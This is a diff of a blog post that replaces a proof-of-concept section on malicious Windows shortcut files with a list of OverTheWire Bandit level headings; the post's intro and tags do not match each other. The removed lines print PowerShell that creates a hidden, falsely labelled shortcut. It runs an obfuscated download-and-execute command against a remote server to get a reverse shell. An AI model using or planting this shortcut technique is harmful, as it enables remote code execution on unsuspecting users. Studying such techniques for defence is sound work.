@@ -10,52 +10,41 @@ tags: [poc, shortcut]
 
 Many time I have started Over The Wire's Bandit labs, but never have I gone through the whole thing. I am documenting my journey through the process.
 
-
-
-```
-The original Powershell script that I modified can be seen below. I pulled it directly from the link to [v3ded's](https://v3ded.github.io/) post included in the resources section.
-
-~~~
-$path                      = "$([Environment]::GetFolderPath('Desktop'))\FakeText.lnk"
-$wshell                    = New-Object -ComObject Wscript.Shell
-$shortcut                  = $wshell.CreateShortcut($path)
-
-$shortcut.IconLocation     = "C:\Windows\System32\shell32.dll,70"
-
-$shortcut.TargetPath       = "cmd.exe"
-$shortcut.Arguments        = "/c calc.exe"
-$shortcut.WorkingDirectory = "C:"
-$shortcut.HotKey           = "CTRL+C"
-$shortcut.Description      = "Nope, not malicious"
-
-$shortcut.WindowStyle      = 7
-                           # 7 = Minimized window
-                           # 3 = Maximized window
-                           # 1 = Normal    window
-$shortcut.Save()
-
-(Get-Item $path).Attributes += 'Hidden' # Optional if we want to make the link invisible (prevent user clicks)
-~~~
-
-Branching from this, I decided to add an IEX statement to download a payload hosted on a remote server. I had it pull and execute shellcode to give me a reverse shell.
-
-~~~
-$path = "$([Environment]::GetFolderPath('Desktop'))\RealText.lnk"
-$wshell = New-Object -ComObject Wscript.Shell
-$shortcut = $wshell.CreateShortcut($path)
-$cmd = [System.Text.Encoding]::ascii.GetString([System.Convert]::FromBase64String('SUVYICgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovLzAuMC4wLjA6ODAwMC9maWxlLnR4dCcpKQ=='))
-$shortcut.IconLocation = "C:\Windows\System32\shell32.dll,70"
-$shortcut.TargetPath = "powershell.exe"
-$shortcut.Arguments = " -c $cmd"
-$shortcut.WorkingDirectory = "C:"
-$shortcut.HotKey = "CTRL+C"
-$shortcut.Description = "I'm a dolphin, not a virus"
-$shortcut.WindowStyle      = 7
-$shortcut.Save()
-(Get-Item $path).Attributes += 'Hidden'
-~~~
-
-
+Level 0
+Level 0 → Level 1
+Level 1 → Level 2
+Level 2 → Level 3
+Level 3 → Level 4
+Level 4 → Level 5
+Level 5 → Level 6
+Level 6 → Level 7
+Level 7 → Level 8
+Level 8 → Level 9
+Level 9 → Level 10
+Level 10 → Level 11
+Level 11 → Level 12
+Level 12 → Level 13
+Level 13 → Level 14
+Level 14 → Level 15
+Level 15 → Level 16
+Level 16 → Level 17
+Level 17 → Level 18
+Level 18 → Level 19
+Level 19 → Level 20
+Level 20 → Level 21
+Level 21 → Level 22
+Level 22 → Level 23
+Level 23 → Level 24
+Level 24 → Level 25
+Level 25 → Level 26
+Level 26 → Level 27
+Level 27 → Level 28
+Level 28 → Level 29
+Level 29 → Level 30
+Level 30 → Level 31
+Level 31 → Level 32
+Level 32 → Level 33
+Level 33 → Level 34
 **Resources**
 
 | Type | Link |
